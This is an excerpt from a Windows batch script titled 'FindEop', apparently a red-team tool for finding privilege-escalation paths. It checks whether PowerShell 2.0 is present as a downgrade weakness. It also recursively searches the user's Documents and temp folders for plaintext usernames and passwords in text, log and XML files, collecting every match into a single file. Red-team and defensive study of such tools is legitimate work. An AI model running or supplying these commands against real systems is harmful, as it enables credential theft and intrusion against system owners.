...
:: ----
TITLE FindEop v1.2.10 {SSA RedTeam @2022}
...
powershell -C "(reg query HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine /v PowerShellVersion | findstr /C:'2.0') -replace '    PowerShellVersion    REG_SZ    2.0','PowerShellVersion : 2.0 => [vuln::T1562]'"
...
IF %ERRORLEVEL% EQU 0 (
   ...
   cd %userprofile%\Documents && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.xml >> %tmp%\cleartext.txt
) ELSE (
...
IF %ERRORLEVEL% EQU 0 (
   ...
   cd %tmp% && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.log *.xml >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] Not found: '%tmp%'
)
